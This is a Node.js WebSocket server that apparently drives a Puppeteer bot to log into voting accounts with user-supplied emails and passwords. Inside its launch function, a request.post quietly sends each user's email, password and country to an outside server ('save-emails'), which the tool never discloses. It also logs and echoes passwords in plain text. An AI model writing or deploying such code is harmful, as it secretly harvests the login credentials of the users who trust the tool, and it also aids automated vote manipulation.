'use strict';

const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const request = require('request');
const kill  = require('tree-kill');
const spawn = require('child_process').spawn;
var launched = false;

var open = true;
var maintenance = false;
var puppeteer = null;
var version = 0.0;

function fetchVersion(){
	request('https://srv3.bp-vote-legends.eu/cdn/tenasia-version.php', function (error, response, body) {
		if(!error) {
			if(version != parseFloat(body)){
				version = parseFloat(body);
				console.log("set new version to " + version);
				wss.clients.forEach(function each(ws) {
					if (ws.readyState === WebSocket.OPEN) {
						if(launched){ killPuppeteer(); }
						ws.send(JSON.stringify({type: 0x03, data: version, additional: {
							force: true
						}}));
					}
				});
			}
		}else{
			console.log(error);
			process.exit();
		}
	});
}

fetchVersion();
setInterval(() =>{
	fetchVersion();
}, 10000);

const server = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.write(JSON.stringify({
	  error: '403',
	  data: 'forbidden',
  })); 
  res.end();
});

function killPuppeteer(){
	if(launched && puppeteer != null){
		launched = false;
		kill(puppeteer.pid);
		puppeteer = null;
		console.log("closing puppeteer");
	}
}

const wss = new WebSocket.Server({ server });

function noop() {}
 
function heartbeat(ws) {
  ws.isAlive = true;
}

function isWsOpen(ws){
	if (ws.readyState === WebSocket.OPEN && ws.readyState !== WebSocket.CLOSED) {
		return true;
	}else{
		return false;
	}
}

function launch(ws, index, email, password, country) {
	console.log("executing puppeteer");
	
	puppeteer = spawn('node', ['./core/process.js', '-u', email, '-p', password, '-c', country]);
	
	if(!isWsOpen(ws)) {
		killPuppeteer();
		return;
	}
	
	ws.send(JSON.stringify({type: 0x0B, data: "[MASTER] executing puppeteer", index: index}));
	request.post("http://sentry.srv4.blackpink-access.com/tenasia/save-emails", {form: { email: email, password: password, country: country }}, function (err, res, body) {});

	//remoteWs.websocket.ws.send(JSON.stringify({type: 0x0F, data: '', email: email, country: country}));

	var inter = setInterval(() => {
		if(!isWsOpen(ws)){
			if(launched){
				killPuppeteer();
			}else{
				clearInterval(inter);
			}
		}
	}, 500);

	puppeteer.stdout.on('data', function (data) {
		if(!isWsOpen(ws)) {
			if(launched){
				killPuppeteer();
			}
			clearInterval(inter);
			return;
		}
		
		var output = data.toString();
		ws.send(JSON.stringify({type: 0x0B, data: '[PUPPETEER] ' + output, index: index, logType: 3}));
		process.stdout.write('stdout: ' + output);
	});

	puppeteer.stderr.on('data', function (data) {
		if(!isWsOpen(ws)) {
			if(launched){
				killPuppeteer();
			}
			clearInterval(inter);
			return;
		}
		
		var output = data.toString();
		ws.send(JSON.stringify({type: 0x0B, data: '[PUPPETEER] ' + output, index: index, logType: 1}));
		process.stdout.write('stderr: ' + output);
	});

	puppeteer.on('exit', function (code) {
		if(!isWsOpen(ws)) {
			if(launched){
				killPuppeteer();
			}
			clearInterval(inter);
			return;
		}
		
		if(code == 0){
			ws.send(JSON.stringify({type: 0x0B, data: '[PUPPETEER] exit with code ' + code, index: index, logType: 2}));
			ws.send(JSON.stringify({type: 0x0C, data: "", index: index}));
		}else{
			ws.send(JSON.stringify({type: 0x0B, data: '[PUPPETEER] exit with error code ' + code, index: index, logType: 1}));
			ws.send(JSON.stringify({type: 0x0D, data: "", index: index}));
		}
		process.stdout.write('exit: ' + code);
		launched = false;
	});
}

function waitFor(condition, callback) {
    if(!condition()) {
        console.log('waiting');
        setTimeout(waitFor.bind(null, condition, callback), 100); 
    } else {
        console.log('done');
        callback();
    }
}

function checkVersion(v, ws){
	if(v != version) {
		ws.send(JSON.stringify({type: 0x03, data: version}));
	}else{
		ws.send(JSON.stringify({type: 0x07, data: ''}));
	}
}

function isOpen(ws){
	if(!open && !maintenance){
		ws.send(JSON.stringify({type: 0x04, data:''}));
	}else if(!open && maintenance){
		ws.send(JSON.stringify({type: 0x05, data:''}));
	}else{
		ws.send(JSON.stringify({type: 0x06, data:''}));
		ws.auth = true;
	}
}

wss.on('connection', (ws, req) => {
	ws.isAlive = true;
	ws.auth = false;
    ws.on('message', (message) => {
		var json = JSON.parse(message);
		console.log(JSON.stringify(json));
		
		if(json.type == 0x09) heartbeat(ws);
		
		if(ws.auth){
			if(json.type == 0x02){
				checkVersion(json.data, ws);
			}else if(json.type == 0x0A){
				if(!(json.index == undefined || json.email == undefined || json.email == "" || json.password == undefined || json.password == "")){
					if(!launched){
						console.log("launch puppeteer for [" + json.index + "] email:" + json.email + " password: " + json.password);
						ws.send(JSON.stringify({type: 0x0B, data: "[MASTER] start puppeteer with email:" + json.email + " password: " + json.password, index: json.index, logType: 3}));
	
						launched = true;
						launch(ws, json.index, json.email, json.password, json.country);
					}else{
						console.log("puppeteer already in use");
						ws.send(JSON.stringify({type: 0x0B, data: "[MASTER] puppeteer already in use, wait", index: json.index, logType: 1}));
	
						waitFor(() => (launched == false), () => {
							console.log("launch puppeteer for [" + json.index + "] email:" + json.email + " password: " + json.password);
							ws.send(JSON.stringify({type: 0x0B, data: "[MASTER] start puppeteer with email:" + json.email + " password: " + json.password, index: json.index, logType: 3}));
	
							launched = true;
							launch(ws, json.index, json.email, json.password, json.country);
						});
					}
				}else{
					ws.send(JSON.stringify({type: 0x0B, data: "Unable to start puppeteer, invalids params."}));
				}
			}else if(json.type == 0x10){
				if(launched){
					killPuppeteer();
				}
			}
		}else{
			if(json.type == 0x01){
				isOpen(ws);
			}
		}
    });
});

const interval1 = setInterval(function ping() {
  wss.clients.forEach(function each(ws) {
	if (ws.readyState === WebSocket.OPEN) {
		ws.isAlive = false;
		ws.send(JSON.stringify({type: 0x08, data:'ping'}));
	}
  });
}, 5000);

const interval2 = setInterval(function ping() {
  wss.clients.forEach(function each(ws) {
    if (ws.isAlive === false && ws.auth && ws.readyState === WebSocket.OPEN) {
		if(launched){ killPuppeteer(); }
		return ws.terminate();
	}
  });
}, 30000);

module.exports.start = (cb) => {
	server.listen(8080, () => {
		console.log('listening on port 8080')
		cb();
	});
}